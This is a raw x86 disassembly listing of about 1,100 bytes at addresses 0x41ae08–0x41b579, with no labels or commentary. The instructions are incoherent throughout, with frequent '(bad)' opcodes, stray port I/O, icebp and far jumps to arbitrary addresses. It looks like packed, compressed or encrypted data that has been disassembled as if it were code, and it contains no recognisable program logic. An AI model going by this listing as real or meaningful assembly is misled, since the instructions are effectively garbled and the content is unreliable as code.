  41ae08:	outs   dx,BYTE PTR ds:[esi]
  41ae09:	(bad)  
  41ae0a:	(bad)  
  41ae0b:	jno    0x41adaf
  41ae0d:	sahf   
  41ae0e:	clc    
  41ae0f:	add    al,BYTE PTR [ebx]
  41ae11:	cmp    al,0x1
  41ae13:	aas    
  41ae14:	sbb    edx,edi
  41ae16:	inc    ebx
  41ae17:	dec    ebp
  41ae18:	mov    dh,0xd
  41ae1a:	adc    al,0xd8
  41ae1c:	repz icebp 
  41ae1e:	sub    DWORD PTR [ebp-0x58],ecx
  41ae21:	lds    esi,FWORD PTR [ebx]
  41ae23:	shr    BYTE PTR [ebx-0x50b0a519],cl
  41ae29:	ror    ch,cl
  41ae2b:	mov    cl,BYTE PTR [ebx-0xc]
  41ae2e:	aaa    
  41ae2f:	loop   0x41add4
  41ae31:	bound  eax,QWORD PTR [ebx-0x5f79804e]
  41ae37:	xchg   esi,eax
  41ae38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae39:	stc    
  41ae3a:	ins    BYTE PTR es:[edi],dx
  41ae3b:	jg     0x41ae58
  41ae3d:	jg     0x41ae37
  41ae3f:	push   edx
  41ae40:	nop
  41ae41:	popa   
  41ae42:	push   ecx
  41ae43:	mov    esp,ebx
  41ae45:	fdivr  DWORD PTR [edx]
  41ae47:	daa    
  41ae48:	jmp    0x41ae0a
  41ae4a:	xchg   BYTE PTR [ebp-0x3f3d1269],bl
  41ae50:	mov    ecx,DWORD PTR [edx-0x7b]
  41ae53:	std    
  41ae54:	ss xor al,0xe7
  41ae57:	fs cmp dl,0xd
  41ae5b:	jb     0x41ae63
  41ae5d:	sub    DWORD PTR [ebp+0x29],0xfffffffb
  41ae61:	out    0x2a,eax
  41ae63:	jge    0x41ae6b
  41ae65:	enter  0x7f72,0x84
  41ae69:	mov    ah,0xef
  41ae6b:	dec    ebx
  41ae6c:	cmp    al,cl
  41ae6e:	jnp    0x41ae7f
  41ae70:	add    DWORD PTR [esi],esp
  41ae72:	(bad)  
  41ae74:	rol    DWORD PTR [ebx-0x15],1
  41ae77:	xor    eax,0x9b03b1db
  41ae7c:	pop    ss
  41ae7d:	jbe    0x41ae76
  41ae7f:	push   cs
  41ae80:	dec    ecx
  41ae81:	push   ebp
  41ae82:	sbb    DWORD PTR [edx-0x7cbe031f],edx
  41ae88:	mov    BYTE PTR [ebp+ebx*4+0x35],dl
  41ae8c:	icebp  
  41ae8d:	retf   0x90a2
  41ae90:	cli    
  41ae91:	inc    ebx
  41ae92:	imul   ecx,DWORD PTR [edx+0x14],0x29
  41ae96:	cmc    
  41ae97:	sbb    bh,cl
  41ae99:	shl    DWORD PTR [ecx+0x76],0x5
  41ae9d:	leave  
  41ae9e:	dec    esi
  41ae9f:	mov    edi,0x7b1d3bd7
  41aea4:	dec    edx
  41aea5:	fisubr WORD PTR [eax-0x7503fd60]
  41aeab:	shl    DWORD PTR [esp-0xa0a404e],1
  41aeb2:	push   eax
  41aeb3:	loop   0x41aea8
  41aeb5:	ss push ebx
  41aeb7:	dec    ecx
  41aeb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb9:	daa    
  41aeba:	xor    eax,0xad59b09a
  41aebf:	test   eax,0x2c213414
  41aec4:	lods   eax,DWORD PTR ds:[esi]
  41aec5:	sub    BYTE PTR [edx-0x19cce52b],bh
  41aecb:	das    
  41aecc:	retf   
  41aecd:	iret   
  41aece:	cli    
  41aecf:	xchg   ebp,eax
  41aed0:	stc    
  41aed1:	lods   eax,DWORD PTR ds:[esi]
  41aed2:	popa   
  41aed3:	xchg   ebx,eax
  41aed4:	aad    0xbb
  41aed6:	mov    WORD PTR [edx],fs
  41aed8:	icebp  
  41aed9:	inc    esi
  41aeda:	push   es
  41aedb:	mov    cl,BYTE PTR [ebx]
  41aedd:	into   
  41aede:	mov    cl,0xfe
  41aee0:	xlat   BYTE PTR ds:[ebx]
  41aee1:	or     DWORD PTR [edx],edi
  41aee3:	cs fwait
  41aee5:	dec    ebp
  41aee6:	rol    DWORD PTR [ebp-0x1da48fa3],cl
  41aeec:	sub    DWORD PTR ds:[edi+ebp*4-0x1129f423],esp
  41aef4:	push   ebp
  41aef5:	in     eax,dx
  41aef6:	jno    0x41af73
  41aef8:	dec    esp
  41aef9:	dec    ebx
  41aefa:	inc    esp
  41aefb:	and    eax,0xdfb6500e
  41af00:	test   eax,0x893af907
  41af05:	clc    
  41af06:	jge    0x41af16
  41af08:	aaa    
  41af09:	xchg   ebx,eax
  41af0a:	dec    ebx
  41af0b:	mov    ch,BYTE PTR [ebp-0x3419eecc]
  41af11:	sbb    esp,DWORD PTR [ebp-0x619fa385]
  41af17:	mov    ebp,0xd4c0bd19
  41af1c:	arpl   WORD PTR [ebp+0x50],cx
  41af1f:	inc    edi
  41af20:	or     BYTE PTR [eax+ebp*1-0x317dbafa],0xa3
  41af28:	out    0xf7,al
  41af2a:	add    BYTE PTR [ecx],cl
  41af2c:	mov    bl,0x87
  41af2e:	sbb    ecx,DWORD PTR [ebx+0x2b]
  41af31:	out    0x88,eax
  41af33:	xchg   esi,eax
  41af34:	ret    
  41af35:	(bad)  
  41af36:	pusha  
  41af37:	add    ebx,DWORD PTR [di]
  41af3a:	mov    ebx,0xa52cb5c7
  41af3f:	cmp    BYTE PTR [ebp+0x57f24158],dh
  41af45:	jnp    0x41afba
  41af47:	push   eax
  41af48:	adc    edx,ecx
  41af4a:	adc    BYTE PTR [ecx+ecx*1],ch
  41af4d:	jmp    0x41afa4
  41af4f:	out    0xc7,eax
  41af51:	mov    ds:0x47352568,eax
  41af56:	push   edi
  41af57:	loop   0x41aefd
  41af59:	jmp    0xc366:0x195bfbef
  41af60:	sti    
  41af61:	imul   eax,ecx,0x84196b9e
  41af67:	sbb    al,ch
  41af69:	loopne 0x41af7f
  41af6b:	xor    esi,DWORD PTR [edi-0x73]
  41af6e:	out    0xab,al
  41af70:	add    eax,0x4f7b5165
  41af75:	pop    ss
  41af76:	or     BYTE PTR [edi+0x2],ch
  41af79:	test   al,0x35
  41af7b:	cmp    cl,ah
  41af7d:	sar    DWORD PTR [eax],0xd
  41af80:	jno    0x41af75
  41af82:	push   ebp
  41af83:	arpl   WORD PTR [edi+eax*8],bp
  41af86:	repz test BYTE PTR [ecx+0x2f7ed251],al
  41af8d:	sbb    eax,0x43897538
  41af92:	(bad)  
  41af93:	sete   bl
  41af96:	ss fwait
  41af98:	aad    0xa6
  41af9a:	jb     0x41b00a
  41af9c:	add    DWORD PTR [ecx+eiz*8+0x44],esp
  41afa0:	in     al,dx
  41afa1:	adc    BYTE PTR [esi+ebp*8-0x57a8352d],bh
  41afa8:	jmp    0x5df4d814
  41afad:	xchg   edi,eax
  41afae:	cwde   
  41afaf:	(bad)
  41afb2:	adc    edx,DWORD PTR [edx+ebx*8-0x47]
  41afb6:	in     al,dx
  41afb7:	pop    esp
  41afb8:	push   esp
  41afb9:	mov    esi,0x84719d9a
  41afbe:	jne    0x41b00c
  41afc0:	out    dx,al
  41afc1:	xlat   BYTE PTR ds:[ebx]
  41afc2:	scas   eax,DWORD PTR es:[edi]
  41afc3:	sahf   
  41afc4:	mov    edi,0xf39001f3
  41afc9:	neg    DWORD PTR [ebx-0x2c]
  41afcc:	add    eax,0x58372461
  41afd1:	pop    ebp
  41afd2:	xor    al,al
  41afd4:	(bad)
  41afd7:	add    DWORD PTR [esi],0xd34ffff3
  41afdd:	inc    edx
  41afde:	sub    al,0x95
  41afe0:	xchg   esi,eax
  41afe1:	jg     0x41afdd
  41afe3:	mov    ch,bh
  41afe5:	shl    BYTE PTR [edi],cl
  41afe7:	test   dh,ah
  41afe9:	outs   dx,DWORD PTR ds:[esi]
  41afea:	cmp    ebx,DWORD PTR [esi]
  41afec:	or     ah,dl
  41afee:	push   edi
  41afef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aff0:	add    bl,bl
  41aff2:	adc    dl,bl
  41aff4:	mov    edx,DWORD PTR [edi]
  41aff6:	cmp    bh,dh
  41aff8:	mov    WORD PTR [edi-0x6ce0a252],cs
  41affe:	jo     0x41afc2
  41b000:	xor    eax,0x91a2d63f
  41b005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b006:	xchg   esi,eax
  41b007:	outs   dx,BYTE PTR ds:[esi]
  41b008:	add    cl,al
  41b00a:	lods   eax,DWORD PTR ds:[esi]
  41b00b:	sbb    ecx,DWORD PTR [edi+0x2d]
  41b00e:	inc    esi
  41b00f:	loope  0x41afa8
  41b011:	ret    0xd1d9
  41b014:	jb     0x41afe3
  41b016:	scas   eax,DWORD PTR es:[edi]
  41b017:	lds    esi,FWORD PTR [edi-0x266e6ee6]
  41b01d:	cs out 0xbf,eax
  41b020:	loope  0x41afbd
  41b022:	ret    0x2868
  41b025:	shl    DWORD PTR [ebp+0x5f],1
  41b028:	dec    ebp
  41b029:	jnp    0x41afec
  41b02b:	xchg   ecx,eax
  41b02c:	lds    esp,FWORD PTR [edi]
  41b02e:	mov    edi,0xc2702abf
  41b033:	xchg   ebp,eax
  41b034:	(bad)  
  41b035:	hlt    
  41b036:	enter  0x9bf3,0x5b
  41b03a:	jns    0x41b0b1
  41b03c:	cld    
  41b03d:	jmp    0x894e:0xf5bc3cb7
  41b044:	sbb    dh,bh
  41b046:	hlt    
  41b047:	cmc    
  41b048:	inc    ebx
  41b049:	cld    
  41b04a:	ss jge 0x41b00c
  41b04d:	test   esi,0x9fe20c44
  41b053:	outs   dx,BYTE PTR ds:[esi]
  41b054:	push   edx
  41b055:	pop    ebp
  41b056:	add    eax,0x279f8d52
  41b05b:	cmp    ah,BYTE PTR cs:[eax-0x7e102588]
  41b062:	mov    cl,0xd9
  41b064:	jne    0x41b098
  41b066:	xchg   esi,eax
  41b067:	cwde   
  41b068:	pop    ebx
  41b069:	pop    ds
  41b06a:	and    BYTE PTR [edi],bh
  41b06c:	pusha  
  41b06d:	jbe    0x41b042
  41b06f:	mov    ds:0x3ade3d40,al
  41b074:	lock sub BYTE PTR [edi],ch
  41b077:	cmp    bh,BYTE PTR [ebx-0x2f8053d6]
  41b07d:	cmp    al,0xb0
  41b07f:	inc    edx
  41b080:	clc    
  41b081:	js     0x41b0e5
  41b083:	pop    esp
  41b084:	push   edi
  41b085:	pushw  ds
  41b087:	mov    al,0xee
  41b089:	xor    DWORD PTR [ebx+0x1],ebp
  41b08c:	scas   eax,DWORD PTR es:[edi]
  41b08d:	fs pop edx
  41b08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b090:	test   eax,0x7cf9b78d
  41b095:	mov    al,0x6a
  41b097:	lahf   
  41b098:	push   DWORD PTR [esi-0x47]
  41b09b:	nop
  41b09c:	and    ecx,DWORD PTR [ebx-0x45c7e95d]
  41b0a2:	add    eax,0x42cad7f9
  41b0a7:	pusha  
  41b0a8:	pop    ecx
  41b0a9:	test   al,0x5
  41b0ab:	jl     0x41b0ea
  41b0ad:	dec    edx
  41b0ae:	lds    ebp,FWORD PTR [ecx+0x36ef3cae]
  41b0b4:	(bad)  
  41b0b6:	jnp    0x41b0c4
  41b0b8:	out    0xef,al
  41b0ba:	and    al,dh
  41b0bc:	mov    BYTE PTR [ebx],bh
  41b0be:	inc    esi
  41b0bf:	rcr    BYTE PTR [esi],1
  41b0c1:	jg     0x41b093
  41b0c3:	in     eax,dx
  41b0c4:	xchg   BYTE PTR [ecx],al
  41b0c6:	(bad)  
  41b0c7:	adc    BYTE PTR [esp+ebp*1+0x3396e563],bl
  41b0ce:	out    0x73,al
  41b0d0:	adc    eax,0xb0f8b922
  41b0d5:	cmc    
  41b0d6:	aas    
  41b0d7:	dec    esp
  41b0d8:	add    eax,0xe4c87f00
  41b0dd:	dec    esp
  41b0de:	inc    ecx
  41b0df:	jecxz  0x41b0f5
  41b0e1:	ds js  0x41b0a4
  41b0e4:	(bad)  
  41b0e6:	lea    esp,[ecx-0xf]
  41b0e9:	fcmovnbe st,st(6)
  41b0eb:	xchg   esp,eax
  41b0ec:	mov    ebx,0x27fe500
  41b0f1:	cmp    ebp,DWORD PTR [ebx-0xe]
  41b0f4:	fisttp QWORD PTR ds:0x5334
  41b0f9:	out    dx,al
  41b0fa:	sub    edi,eax
  41b0fc:	or     bl,BYTE PTR [esi+0x3a]
  41b0ff:	jo     0x41b0c0
  41b101:	mov    bl,0xa8
  41b103:	out    0xb4,eax
  41b105:	jp     0x41b172
  41b107:	aas    
  41b108:	jne    0x41b0ef
  41b10a:	mov    al,0xbb
  41b10c:	or     eax,0xde2d9fc1
  41b111:	cwde   
  41b112:	adc    al,0x88
  41b114:	das    
  41b115:	in     eax,dx
  41b116:	fidivr WORD PTR [esi-0x67d45e5f]
  41b11c:	sbb    al,BYTE PTR [esi+0x28]
  41b11f:	push   ss
  41b120:	mov    bh,dl
  41b122:	xor    BYTE PTR [edx+0xd],0xa0
  41b126:	outs   dx,BYTE PTR ds:[esi]
  41b127:	adc    dl,al
  41b129:	fst    QWORD PTR [edi]
  41b12b:	mov    ch,dh
  41b12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b12e:	xor    cl,BYTE PTR [edi-0x55]
  41b131:	add    BYTE PTR [edi-0x4abaf6b],ch
  41b137:	jns    0x41b108
  41b139:	jl     0x41b13f
  41b13b:	sub    ch,BYTE PTR [eax+0x67]
  41b13e:	push   edx
  41b13f:	out    0x6d,al
  41b141:	and    BYTE PTR [esi],dh
  41b143:	fisub  WORD PTR [eax-0x3e]
  41b146:	fiadd  WORD PTR [ecx]
  41b148:	xor    eax,0xa90619c0
  41b14d:	test   al,0x9a
  41b14f:	(bad)  
  41b150:	mov    cl,0x84
  41b152:	lahf   
  41b153:	std    
  41b154:	inc    edi
  41b155:	xor    eax,0xb44396b4
  41b15a:	pop    ebp
  41b15b:	xchg   ecx,eax
  41b15c:	mov    ebx,ebp
  41b15e:	in     eax,dx
  41b15f:	ficom  WORD PTR [ecx]
  41b161:	out    dx,eax
  41b162:	push   cs
  41b163:	pop    esp
  41b164:	popf   
  41b165:	jg     0x41b19f
  41b167:	or     BYTE PTR [ecx+0xd],ah
  41b16a:	aam    0xa9
  41b16c:	fdiv   QWORD PTR [edx]
  41b16e:	mov    bh,0x16
  41b170:	and    BYTE PTR [eax+eiz*8-0x48],ch
  41b174:	frstor [ecx-0x6a]
  41b177:	adc    DWORD PTR [ebp-0x7b],ebp
  41b17a:	cwde   
  41b17b:	rol    BYTE PTR [ebp+ebx*2-0x49],cl
  41b17f:	inc    edi
  41b180:	fnsave [ebx-0x22aad321]
  41b186:	jle    0x41b134
  41b188:	mov    ds:0xf31d08d2,eax
  41b18d:	lods   al,BYTE PTR ds:[esi]
  41b18e:	ins    BYTE PTR es:[edi],dx
  41b18f:	or     eax,0x6eaddb6b
  41b194:	xchg   esp,eax
  41b195:	pop    edi
  41b196:	xchg   edx,eax
  41b197:	xchg   ebx,eax
  41b198:	out    0x7a,eax
  41b19a:	loopne 0x41b139
  41b19c:	shl    BYTE PTR [edx-0x6651083a],0x20
  41b1a3:	imul   ebp,DWORD PTR [edx-0x24],0x60
  41b1a7:	inc    ecx
  41b1a8:	int    0xb1
  41b1aa:	out    dx,eax
  41b1ab:	inc    ebp
  41b1ac:	and    DWORD PTR [esi],eax
  41b1ae:	adc    DWORD PTR [edx+0x602b66b1],eax
  41b1b4:	test   edi,esi
  41b1b6:	pop    eax
  41b1b7:	jo     0x41b1a8
  41b1b9:	in     eax,0x9a
  41b1bb:	adc    eax,0x234316a6
  41b1c0:	retf   0x7da
  41b1c3:	daa    
  41b1c4:	js     0x41b208
  41b1c6:	pop    ecx
  41b1c7:	scas   eax,DWORD PTR es:[edi]
  41b1c8:	fdiv   QWORD PTR [esi]
  41b1ca:	pop    edx
  41b1cb:	add    esp,eax
  41b1cd:	cli    
  41b1ce:	(bad)  
  41b1cf:	and    al,0xa6
  41b1d1:	jecxz  0x41b16a
  41b1d3:	ja     0x41b1b3
  41b1d5:	jmp    0x36a8f5e9
  41b1da:	std    
  41b1db:	xor    al,0xd0
  41b1dd:	arpl   WORD PTR [ebx-0x718f58db],cx
  41b1e3:	cmp    dl,BYTE PTR [esi]
  41b1e5:	(bad)  
  41b1e7:	div    DWORD PTR ds:0xe62f0fa3
  41b1ed:	daa    
  41b1ee:	jge    0xdaca74d6
  41b1f4:	cmc    
  41b1f5:	sbb    edx,DWORD PTR [eax+0x69226450]
  41b1fb:	sbb    BYTE PTR [edx+ebx*2-0x5763dafa],dh
  41b202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b203:	adc    eax,0x7c78c4f3
  41b208:	xor    esp,DWORD PTR [ebp+ecx*4+0x70cf180]
  41b20f:	add    DWORD PTR [edi],edx
  41b211:	(bad)  
  41b212:	into   
  41b213:	daa    
  41b214:	inc    ebp
  41b215:	and    al,0xf5
  41b217:	sahf   
  41b218:	icebp  
  41b219:	ja     0x41b21a
  41b21b:	int    0xea
  41b21d:	add    ecx,DWORD PTR ds:0x8374d685
  41b223:	jmp    0x6b13e8eb
  41b228:	repnz lds edi,FWORD PTR [edi+0x76]
  41b22c:	inc    esp
  41b22d:	repz mov dh,0x3a
  41b230:	pop    esi
  41b231:	mov    ss,WORD PTR [esi+0x267d9533]
  41b237:	daa    
  41b238:	mov    ah,0x3e
  41b23a:	repnz mov ecx,0x41023021
  41b240:	jmp    0x41b255
  41b242:	fisttp QWORD PTR [eax]
  41b244:	inc    eax
  41b245:	stc    
  41b246:	loope  0x41b2b3
  41b248:	mov    ah,0xf5
  41b24a:	mov    ?,WORD PTR [ecx+edi*4+0x767563a4]
  41b251:	inc    BYTE PTR [esi-0x5]
  41b254:	push   0xffffffd1
  41b256:	pusha  
  41b257:	xchg   edi,eax
  41b258:	lock jb 0x41b230
  41b25b:	xchg   ecx,eax
  41b25c:	lods   al,BYTE PTR ds:[esi]
  41b25d:	ins    BYTE PTR es:[edi],dx
  41b25e:	out    dx,eax
  41b25f:	inc    esp
  41b260:	imul   BYTE PTR [ecx-0x25]
  41b263:	mov    ch,BYTE PTR [ebp-0x43ec6c8c]
  41b269:	lods   eax,DWORD PTR ds:[esi]
  41b26a:	pop    ss
  41b26b:	fiadd  DWORD PTR [esi]
  41b26d:	push   cs
  41b26e:	out    0xd5,eax
  41b270:	icebp  
  41b271:	or     BYTE PTR [esi-0x3a],dh
  41b274:	cmp    ah,BYTE PTR [edi]
  41b276:	pushf  
  41b277:	icebp  
  41b278:	pop    ds
  41b279:	mov    ch,dh
  41b27b:	pop    esi
  41b27c:	inc    ebx
  41b27d:	push   eax
  41b27e:	jp     0x41b227
  41b280:	popa   
  41b281:	mov    ebp,es
  41b283:	push   ecx
  41b284:	fidiv  DWORD PTR [esi]
  41b286:	push   edx
  41b287:	jnp    0x41b2e3
  41b289:	dec    ebp
  41b28a:	inc    ebx
  41b28b:	test   BYTE PTR [edi+edx*2+0x5adf4e0d],bh
  41b292:	push   ecx
  41b293:	aaa    
  41b294:	pop    ebx
  41b295:	adc    esp,edi
  41b297:	ins    BYTE PTR es:[edi],dx
  41b298:	xor    esi,ebp
  41b29a:	dec    ebp
  41b29b:	pushf  
  41b29c:	call   0x640ea4e6
  41b2a1:	out    dx,al
  41b2a2:	sub    al,0xfa
  41b2a4:	mov    al,ds:0xaab81647
  41b2a9:	push   esi
  41b2aa:	cmp    al,0x36
  41b2ac:	xlat   BYTE PTR ds:[ebx]
  41b2ad:	nop
  41b2ae:	retf   
  41b2af:	cwde   
  41b2b0:	sub    BYTE PTR [edx*8+0x696bed0f],cl
  41b2b7:	repnz push edi
  41b2b9:	jmp    0xf34c:0x4eee3a5a
  41b2c0:	in     eax,0x42
  41b2c2:	mov    al,ds:0x13d1a07d
  41b2c7:	mov    al,ch
  41b2c9:	add    cl,ah
  41b2cb:	dec    eax
  41b2cc:	shl    eax,0x8e
  41b2cf:	jo     0x41b2b6
  41b2d1:	dec    ecx
  41b2d2:	mov    ds:0x9b9dd286,eax
  41b2d7:	lods   eax,DWORD PTR ds:[esi]
  41b2d8:	push   ecx
  41b2d9:	jno    0x41b31c
  41b2db:	call   0xe07f:0x8cc0420d
  41b2e2:	push   esi
  41b2e3:	and    dl,0x6e
  41b2e6:	push   edi
  41b2e7:	xor    DWORD PTR [ebx],ecx
  41b2e9:	imul   ebx,DWORD PTR [eax+edi*2-0x3c],0xd73b9704
  41b2f1:	push   ds
  41b2f2:	jmp    0x33f0:0x83968966
  41b2f9:	imul   edx,DWORD PTR [ebp+edx*8-0x202ac8a5],0xffffff80
  41b301:	cli    
  41b302:	add    ebp,DWORD PTR [edi]
  41b304:	in     eax,0x56
  41b306:	add    dl,dl
  41b308:	mov    ebp,0x1a586a0c
  41b30d:	imul   eax,ecx,0x44f16aeb
  41b313:	mov    ch,0x93
  41b315:	sbb    al,bl
  41b317:	loope  0x41b2c6
  41b319:	test   al,0x99
  41b31b:	fmul   DWORD PTR [eax]
  41b31d:	int3   
  41b31e:	gs pop ecx
  41b320:	retf   0xcf37
  41b323:	push   ebp
  41b324:	mov    cl,0xa1
  41b326:	push   0xffffffa1
  41b328:	adc    esi,edx
  41b32a:	pop    ebx
  41b32b:	or     al,BYTE PTR ds:0xa409663a
  41b331:	in     al,dx
  41b332:	in     eax,dx
  41b333:	rcl    BYTE PTR [ebp+0x775a8ec1],cl
  41b339:	sbb    al,BYTE PTR [edi+edi*4+0x4c13f0e1]
  41b340:	mov    esi,0x63eb8e45
  41b345:	add    edi,DWORD PTR [edi-0x5da85b87]
  41b34b:	push   es
  41b34c:	cmp    al,dl
  41b34e:	sub    ebx,DWORD PTR [ebp-0x4998e6a4]
  41b354:	xchg   DWORD PTR [esi-0x6d4ac323],ebp
  41b35a:	adc    al,0x1a
  41b35c:	pop    edx
  41b35d:	push   ss
  41b35e:	inc    esp
  41b35f:	loop   0x41b36d
  41b361:	xchg   DWORD PTR [edx],edx
  41b363:	xor    al,0x9
  41b365:	mov    dh,bh
  41b367:	dec    edi
  41b368:	test   eax,0xd1e4725f
  41b36d:	test   eax,0xf57af3b5
  41b372:	xor    al,0xcb
  41b374:	mov    eax,ds:0xd23e6fe9
  41b379:	popa   
  41b37a:	or     eax,0xa63e016
  41b37f:	shr    DWORD PTR [ecx-0x7],0x76
  41b383:	jne    0x41b30a
  41b385:	or     al,0x76
  41b388:	and    eax,0xad6d0030
  41b38d:	ret    
  41b38e:	and    al,0xa9
  41b391:	xchg   ebx,eax
  41b392:	mov    ebx,eax
  41b394:	jno    0x41b39f
  41b396:	fidivr WORD PTR [edi]
  41b398:	clc    
  41b399:	mov    al,0x4b
  41b39b:	add    DWORD PTR [edx+0x1179225a],ebp
  41b3a1:	sbb    BYTE PTR [edx+ebp*1+0x23],cl
  41b3a5:	push   ecx
  41b3a6:	scas   al,BYTE PTR es:[edi]
  41b3a7:	inc    esp
  41b3a8:	repz or DWORD PTR [esi+0x6c],ebp
  41b3ac:	jp     0x41b3f1
  41b3ae:	pop    esi
  41b3af:	adc    eax,0xc2557f12
  41b3b4:	or     al,0xc7
  41b3b6:	jmp    0x41b386
  41b3b8:	addr16 pushf 
  41b3ba:	cmc    
  41b3bb:	hlt    
  41b3bc:	mov    bh,0xa9
  41b3be:	or     DWORD PTR [ebx+0x12],ebx
  41b3c1:	jp     0x41b3d0
  41b3c3:	repz sub eax,0xdcbc6419
  41b3c9:	xor    al,0x73
  41b3cb:	mov    ebp,0xd0816ecc
  41b3d0:	test   al,0x79
  41b3d2:	cwde   
  41b3d3:	jnp    0x41b41f
  41b3d5:	pop    eax
  41b3d6:	fnstcw WORD PTR [ebx+0x7e615584]
  41b3dc:	adc    eax,0x2d04f80d
  41b3e1:	in     eax,0x95
  41b3e3:	add    DWORD PTR [eax],edi
  41b3e5:	add    eax,0x61b53332
  41b3ea:	pop    ebp
  41b3eb:	cmc    
  41b3ec:	jne    0x41b462
  41b3ee:	in     al,dx
  41b3ef:	clc    
  41b3f0:	cld    
  41b3f1:	fisttp QWORD PTR [ebp-0x4e]
  41b3f4:	test   eax,0x868c7293
  41b3f9:	loopne 0x41b3a3
  41b3fb:	ror    DWORD PTR [edx],0x21
  41b3fe:	aas    
  41b3ff:	xchg   DWORD PTR [edi],eax
  41b401:	xor    DWORD PTR [edx],0x7d
  41b404:	jno    0x41b40b
  41b406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b407:	and    ecx,ebp
  41b409:	lahf   
  41b40a:	popa   
  41b40b:	mov    ebx,0x8c8495f
  41b410:	push   0x514c7624
  41b415:	fs add eax,0x8d18c41
  41b41b:	es popa 
  41b41d:	arpl   WORD PTR [ebp-0x3aa640cc],cx
  41b423:	and    ebp,edi
  41b425:	mov    ch,0x8a
  41b427:	cli    
  41b428:	inc    esp
  41b429:	mov    al,ds:0x19de34fb
  41b42e:	dec    edx
  41b42f:	cmp    ebx,DWORD PTR [ebx+0x1c]
  41b432:	cmp    bl,cl
  41b434:	mov    cl,ch
  41b436:	leave  
  41b437:	add    DWORD PTR [edx-0x7e],ebp
  41b43a:	xor    ebp,edi
  41b43c:	mov    ds:0x23bc1253,eax
  41b441:	push   0xffffffee
  41b443:	inc    esp
  41b444:	sbb    dh,al
  41b446:	shr    DWORD PTR [ebp-0x7a0454af],0x9b
  41b44d:	loope  0x41b3fb
  41b44f:	add    eax,0x6ef2a961
  41b454:	shl    DWORD PTR [ecx+0x2f4fbe2],1
  41b45a:	ror    dh,cl
  41b45c:	add    edx,DWORD PTR [eax+0x49dde25f]
  41b462:	retf   0x2344
  41b465:	lods   al,BYTE PTR ds:[esi]
  41b466:	add    DWORD PTR [eax-0xce72d4b],edx
  41b46c:	jb     0x41b42a
  41b46e:	mov    bl,0xa4
  41b470:	mov    esi,DWORD PTR [ebx+0x6d]
  41b473:	jp     0x41b422
  41b475:	sub    eax,0x240bcbd6
  41b47a:	pop    ebx
  41b47b:	cmp    al,0x53
  41b47d:	pop    ebx
  41b47e:	jmp    0x41b46f
  41b480:	jbe    0x41b468
  41b482:	into   
  41b483:	inc    edi
  41b484:	jnp    0x41b4e3
  41b486:	scas   eax,DWORD PTR es:[edi]
  41b487:	push   ecx
  41b488:	fsub   QWORD PTR [esi-0x25def752]
  41b48e:	sbb    DWORD PTR ds:0x8224ac1b,edi
  41b494:	or     al,0x6d
  41b496:	or     eax,0x27ed05de
  41b49b:	add    eax,0x4d0db825
  41b4a0:	bound  esi,QWORD PTR [edx-0x21]
  41b4a3:	pop    esi
  41b4a4:	in     eax,dx
  41b4a5:	scas   al,BYTE PTR es:[edi]
  41b4a6:	mov    cl,0x69
  41b4a8:	jge    0x41b4ac
  41b4aa:	aam    0xb9
  41b4ac:	in     eax,0x1
  41b4ae:	lods   al,BYTE PTR ds:[esi]
  41b4af:	sub    cl,0xae
  41b4b2:	psadbw mm2,QWORD PTR [esi]
  41b4b5:	es mov eax,0xe15203b9
  41b4bb:	jno    0x41b523
  41b4bd:	addr16 in eax,dx
  41b4bf:	aaa    
  41b4c0:	xlat   BYTE PTR ds:[ebx]
  41b4c1:	test   bh,bl
  41b4c3:	xor    BYTE PTR fs:[esi-0x43],0x63
  41b4c8:	mov    ds:0x40581609,eax
  41b4cd:	push   esi
  41b4ce:	push   0x48
  41b4d0:	push   ss
  41b4d1:	xor    BYTE PTR ds:0xa53d6206,0xc1
  41b4d8:	xchg   ecx,ecx
  41b4da:	iret   
  41b4db:	dec    esp
  41b4dc:	inc    BYTE PTR [ebx+eiz*1-0x70]
  41b4e0:	adc    BYTE PTR [eax+0x29ad283e],dl
  41b4e6:	mov    edi,0xab371810
  41b4eb:	push   ss
  41b4ec:	mov    eax,0x52a9e14d
  41b4f1:	mov    esp,0x55371199
  41b4f6:	out    dx,eax
  41b4f7:	jp     0x41b55a
  41b4f9:	dec    edx
  41b4fa:	js     0x41b490
  41b4fc:	add    BYTE PTR [eax],dl
  41b4fe:	nop
  41b4ff:	aas    
  41b500:	stc    
  41b501:	leave  
  41b502:	adc    edi,ebp
  41b504:	mov    bl,0xb2
  41b506:	je     0x41b4f4
  41b508:	pop    ebp
  41b509:	xchg   esp,eax
  41b50a:	sbb    DWORD PTR [edx+0x17],ebp
  41b50d:	gs fs pop es
  41b510:	cmp    ebx,DWORD PTR [esi-0xe29929]
  41b516:	lods   eax,DWORD PTR ds:[esi]
  41b517:	aam    0x9
  41b519:	(bad)  
  41b51a:	xor    edi,DWORD PTR [eax+0x57]
  41b51d:	dec    ebx
  41b51e:	and    BYTE PTR [edi-0x15],0xeb
  41b522:	test   al,0x6
  41b524:	sahf   
  41b525:	mov    ds:0x4ef1bd5d,eax
  41b52a:	push   ebp
  41b52b:	data16 mov al,0x6d
  41b52e:	pop    ds
  41b52f:	add    eax,0x73fad358
  41b534:	inc    ecx
  41b535:	sub    al,0x37
  41b537:	ins    BYTE PTR es:[edi],dx
  41b538:	(bad)  
  41b539:	fdivr  QWORD PTR ds:0x6628bb33
  41b53f:	dec    esi
  41b540:	pop    ss
  41b541:	loop   0x41b51c
  41b543:	es dec ebx
  41b545:	lock dec ecx
  41b547:	int    0xa8
  41b549:	inc    esp
  41b54a:	mov    ch,0x98
  41b54c:	mov    eax,ds:0x5442df36
  41b551:	iret   
  41b552:	adc    al,dl
  41b554:	scas   al,BYTE PTR es:[edi]
  41b555:	shl    BYTE PTR [ebx],0x49
  41b558:	and    eax,0x360060d9
  41b55d:	in     al,dx
  41b55e:	cli    
  41b55f:	int3   
  41b560:	inc    BYTE PTR [ecx+edi*8-0x456de430]
  41b567:	mov    ch,0xed
  41b569:	dec    esi
  41b56a:	mov    ebx,0x77b2fe7d
  41b56f:	mov    al,ds:0xb8e981b1
  41b574:	push   0xbc16afdd
  41b579:	add    al,0x79
